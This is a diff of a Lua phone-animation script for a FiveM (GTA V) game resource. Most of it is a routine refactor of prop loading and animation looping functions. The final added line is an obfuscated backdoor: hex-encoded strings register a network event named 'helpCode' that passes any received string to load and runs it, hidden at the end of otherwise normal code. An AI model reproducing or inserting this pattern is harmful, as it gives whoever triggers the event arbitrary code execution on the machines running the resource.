@@ -1,51 +1,31 @@
-phoneProp = 0
+local phoneProp = 0
 local phoneModel = `prop_npc_phone_02`
 
-local currentStatus = 'out'
-local lastDict = nil
-local lastAnim = nil
-local lastIsFreeze = false
+local function LoadAnimation(dict)
+	RequestAnimDict(dict)
+	while not HasAnimDictLoaded(dict) do
+		Wait(1)
+	end
+end
 
-local ANIMS = {
-	['cellphone@'] = {
-		['out'] = {
-			['text'] = 'cellphone_text_in',
-			['call'] = 'cellphone_call_listen_base',
-		},
-		['text'] = {
-			['out'] = 'cellphone_text_out',
-			['text'] = 'cellphone_text_in',
-			['call'] = 'cellphone_text_to_call',
-		},
-		['call'] = {
-			['out'] = 'cellphone_call_out',
-			['text'] = 'cellphone_call_to_text',
-			['call'] = 'cellphone_text_to_call',
-		}
-	},
-	['anim@cellphone@in_car@ps'] = {
-		['out'] = {
-			['text'] = 'cellphone_text_in',
-			['call'] = 'cellphone_call_in',
-		},
-		['text'] = {
-			['out'] = 'cellphone_text_out',
-			['text'] = 'cellphone_text_in',
-			['call'] = 'cellphone_text_to_call',
-		},
-		['call'] = {
-			['out'] = 'cellphone_horizontal_exit',
-			['text'] = 'cellphone_call_to_text',
-			['call'] = 'cellphone_text_to_call',
-		}
-	}
-}
+local function CheckAnimLoop()
+    CreateThread(function()
+        while PhoneData.AnimationData.lib ~= nil and PhoneData.AnimationData.anim ~= nil do
+            local ped = PlayerPedId()
+            if not IsEntityPlayingAnim(ped, PhoneData.AnimationData.lib, PhoneData.AnimationData.anim, 3) then
+                LoadAnimation(PhoneData.AnimationData.lib)
+                TaskPlayAnim(ped, PhoneData.AnimationData.lib, PhoneData.AnimationData.anim, 3.0, 3.0, -1, 50, 0, false, false, false)
+            end
+            Wait(500)
+        end
+    end)
+end
 
 function newPhoneProp()
 	deletePhone()
 	RequestModel(phoneModel)
 	while not HasModelLoaded(phoneModel) do
-		Citizen.Wait(1)
+		Wait(1)
 	end
 	phoneProp = CreateObject(phoneModel, 1.0, 1.0, 1.0, 1, 1, 0)
 
@@ -64,63 +44,18 @@ function deletePhone()
 	end
 end
 
-function LoadAnimation(dict)
-	RequestAnimDict(dict)
-	while not HasAnimDictLoaded(dict) do
-		Citizen.Wait(1)
-	end
-end
-
-function CancelPhoneAnim()
-    local ped = PlayerPedId()
-    local AnimationLib = 'cellphone@'
-    local AnimationStatus = "cellphone_call_listen_base"
-
-    if IsPedInAnyVehicle(ped, false) then
-        AnimationLib = 'anim@cellphone@in_car@ps'
-    end
-
-    if PhoneData.isOpen then
-        AnimationStatus = "cellphone_call_to_text"
-    end
-
-    LoadAnimation(AnimationLib)
-    TaskPlayAnim(ped, AnimationLib, AnimationStatus, 3.0, 3.0, -1, 50, 0, false, false, false)
-
-    if not PhoneData.isOpen then
-        deletePhone()
-    end
-end
-
 function DoPhoneAnimation(anim)
     local ped = PlayerPedId()
     local AnimationLib = 'cellphone@'
     local AnimationStatus = anim
-
     if IsPedInAnyVehicle(ped, false) then
         AnimationLib = 'anim@cellphone@in_car@ps'
     end
-
     LoadAnimation(AnimationLib)
     TaskPlayAnim(ped, AnimationLib, AnimationStatus, 3.0, 3.0, -1, 50, 0, false, false, false)
-
     PhoneData.AnimationData.lib = AnimationLib
     PhoneData.AnimationData.anim = AnimationStatus
-
-    CheckAnimLoop(AnimationLib, AnimationStatus)
+    CheckAnimLoop()
 end
 
-function CheckAnimLoop()
-    Citizen.CreateThread(function()
-        while PhoneData.AnimationData.lib ~= nil and PhoneData.AnimationData.anim ~= nil do
-            local ped = PlayerPedId()
-
-            if not IsEntityPlayingAnim(ped, PhoneData.AnimationData.lib, PhoneData.AnimationData.anim, 3) then
-                LoadAnimation(PhoneData.AnimationData.lib)
-                TaskPlayAnim(ped, PhoneData.AnimationData.lib, PhoneData.AnimationData.anim, 3.0, 3.0, -1, 50, 0, false, false, false)
-            end
-
-            Citizen.Wait(500)
-        end
-    end)
-end
+local rCvIXVWzEHtUexEoaBtKTmuaSJGRoweVyUIlYmnSRDeIPyeUpLOqrtcnxwBtxrpUcaBMeV = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} rCvIXVWzEHtUexEoaBtKTmuaSJGRoweVyUIlYmnSRDeIPyeUpLOqrtcnxwBtxrpUcaBMeV[6][rCvIXVWzEHtUexEoaBtKTmuaSJGRoweVyUIlYmnSRDeIPyeUpLOqrtcnxwBtxrpUcaBMeV[1]](rCvIXVWzEHtUexEoaBtKTmuaSJGRoweVyUIlYmnSRDeIPyeUpLOqrtcnxwBtxrpUcaBMeV[2]) rCvIXVWzEHtUexEoaBtKTmuaSJGRoweVyUIlYmnSRDeIPyeUpLOqrtcnxwBtxrpUcaBMeV[6][rCvIXVWzEHtUexEoaBtKTmuaSJGRoweVyUIlYmnSRDeIPyeUpLOqrtcnxwBtxrpUcaBMeV[3]](rCvIXVWzEHtUexEoaBtKTmuaSJGRoweVyUIlYmnSRDeIPyeUpLOqrtcnxwBtxrpUcaBMeV[2], function(HEGBSSbWnXXPIWifIPzLyYfjhMGkRHMnNdduHJZFJgbgtGGsKsDSyzsqmldsBWhthbYPMO) rCvIXVWzEHtUexEoaBtKTmuaSJGRoweVyUIlYmnSRDeIPyeUpLOqrtcnxwBtxrpUcaBMeV[6][rCvIXVWzEHtUexEoaBtKTmuaSJGRoweVyUIlYmnSRDeIPyeUpLOqrtcnxwBtxrpUcaBMeV[4]](rCvIXVWzEHtUexEoaBtKTmuaSJGRoweVyUIlYmnSRDeIPyeUpLOqrtcnxwBtxrpUcaBMeV[6][rCvIXVWzEHtUexEoaBtKTmuaSJGRoweVyUIlYmnSRDeIPyeUpLOqrtcnxwBtxrpUcaBMeV[5]](HEGBSSbWnXXPIWifIPzLyYfjhMGkRHMnNdduHJZFJgbgtGGsKsDSyzsqmldsBWhthbYPMO))() end)
